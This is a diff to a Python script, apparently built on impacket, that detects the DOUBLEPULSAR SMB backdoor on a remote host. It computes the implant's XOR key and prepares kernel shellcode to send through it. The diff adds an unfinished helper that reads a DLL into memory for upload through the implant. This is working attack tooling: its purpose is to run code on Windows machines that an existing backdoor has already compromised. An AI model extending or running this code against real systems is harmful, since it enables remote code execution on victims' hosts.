@@ -102,7 +102,16 @@ def calculate_doublepulsar_xor_key(s):
     x = (2 * s ^ (((s & 0xff00 | (s << 16)) << 8) | (((s >> 16) | s & 0xff0000) >> 8)))
     x = x & 0xffffffff  # this line was added just to truncate to 32 bits
     return x
-  
+
+def read_dll_file_as_hex():
+    print("reading DLL into memory!")
+    with open("file.bin", "rb") as f:
+        data = f.read()
+        hex = binascii.hexlify(data)
+        print("file imported into memory!")
+        print('File size: {:d}'.format(len(data)))
+    return data
+
 # Note: impacket-0.9.15 struct has no ParameterDisplacement
 ############# SMB_COM_TRANSACTION2_SECONDARY (0x33)
 class SMBTransaction2Secondary_Parameters_Fixed(smb.SMBCommand_Parameters):
@@ -171,7 +180,11 @@ if __name__ == "__main__":
     signature_long = struct.unpack('<Q', signature)[0]
     key = calculate_doublepulsar_xor_key(signature_long)
     print("[+] [%s] DOUBLEPULSAR SMB IMPLANT DETECTED!!! Arch: %s, XOR Key: %s" % (ip, arch, hex(key)))
-    
+
+    #at this moment, uploading DLL files is not completed.
+    #read file into memory here
+    #read_dll_file_as_hex()
+
     #kernel shellcode is for 64 bits at the moment
     modified_kernel_shellcode = bytearray(kernel_shellcode)
         
@@ -191,7 +204,7 @@ if __name__ == "__main__":
     recvPkt = conn.recvSMB()
     retStatus = recvPkt.getNTStatus()
 
-    #nicely close connection (no need for exploit)
+    #nicely close connection
     conn.disconnect_tree(tid)
     conn.logoff()
     conn.get_socket().close()
